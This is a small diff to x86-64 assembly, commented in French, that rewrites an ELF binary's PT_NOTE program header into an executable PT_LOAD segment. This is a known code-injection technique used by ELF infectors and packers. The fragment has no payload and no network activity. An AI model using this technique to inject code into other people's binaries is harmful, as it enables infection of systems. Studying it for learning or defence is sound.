@@ -71,6 +71,7 @@ _start:
     mov rbx, [rax + E_PHOFF]    ; e_phoff = offset table phdrs
     add rbx, rax    ; rbx = adresse du 1er phdr
     movzx rcx, word [rax + E_PHNUM] ; nombre de segments
+    xor r14, r14 ; r14 = max(vaddr + memsz) des LOAD
 
     .find_note:
     cmp dword [rbx + P_TYPE], PT_NOTE       ; on compare la veleur p_type du phdr avec PT_NOTE
@@ -84,9 +85,7 @@ _start:
 
     .found: ; label : PT_NOTE trouve
 
-    mov rax, [fsize]    ; taille du fichier cible
-    add rax, 0xFFF  ; arrondir au 0x1000 superieur
-    and rax, ~0xFFF     ; enleve les 12 bits du bas
+    mov rax, [fsize]    ; taille du fichier cible (offset exact)
 
     mov dword [rbx + P_TYPE], PT_LOAD   ; type = PT_LOAD
     mov dword [rbx + P_FLAGS], PF_R | PF_X ; flags = lisible + executable
